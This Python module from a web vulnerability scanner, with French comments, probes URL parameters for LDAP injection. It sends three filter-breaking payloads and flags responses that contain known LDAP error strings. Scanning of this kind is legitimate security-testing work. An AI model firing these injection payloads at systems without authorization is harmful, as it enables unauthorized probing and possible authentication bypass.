#!/usr/bin/env python3
"""
⚠️ LDAP Injection (CWE-90) — OWASP A05:2025
Patterns stricts : erreurs LDAP réelles uniquement (pas de faux positifs).
"""

from colorama import Fore, Style

# Erreurs LDAP spécifiques (pas de mots génériques type "objectclass" ou "ldap" dans page normale)
LDAP_ERROR_PATTERNS = [
    'ldap_bind', 'ldap_search', 'ldap_err', 'ldap_result',
    'invalid dn', 'malformed filter', 'invalid filter',
    'javax.naming.NamingException', 'javax.naming.InvalidNameException',
    'LDAPException', 'LDAP result code', 'ldap_connect',
    'supplied argument is not a valid ldap', 'ldap_unbind',
    'No such object', 'invalid dn syntax', 'Operations Error',
]
# Mots à ignorer (trop génériques, présents dans pages normales)
LDAP_FALSE_POSITIVE = ['objectclass', 'objectclass=', 'javax.naming', 'ldap']


class LDAPInjection:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive

    def scan(self, params):
        print(f"\n{Fore.CYAN}[⚠️ LDAP INJECTION] {Style.RESET_ALL}\n")

        payloads = ["*)(uid=*))(|(uid=*", "admin)(&", "*)(|(objectClass=*))"]
        vulnerabilities = []
        get = getattr(self.engine, 'get', self.engine.session.get)
        _timeout = getattr(self.engine, 'request_timeout', 5)

        for param in params:
            print(f"  {Fore.BLUE}→ Test paramètre: {Fore.YELLOW}{param}{Style.RESET_ALL}")
            for payload in payloads:
                url = self.engine.build_url(param, payload)
                if not url:
                    continue
                try:
                    resp = get(url, timeout=_timeout)
                    txt = resp.text.lower()
                    if any(p in txt for p in ['sql syntax', 'mysql error', 'pdoexception', 'sqlstate']):
                        continue
                    # Seulement les erreurs LDAP explicites
                    for pattern in LDAP_ERROR_PATTERNS:
                        if pattern.lower() in txt:
                            vuln = {'type': 'ldap', 'cwe': 'CWE-90', 'param': param, 'payload': payload,
                                    'url': url, 'evidence': f'Erreur LDAP détectée: {pattern}'}
                            vulnerabilities.append(vuln)
                            print(f"\n    {Fore.CYAN}[💥 LDAP Injection CONFIRMÉ] {Style.RESET_ALL}{param}")
                            print(f"      Payload: {payload}")
                            print(f"      Preuve: {pattern}\n")
                            break
                    else:
                        continue
                    break
                except Exception:
                    continue

        return vulnerabilities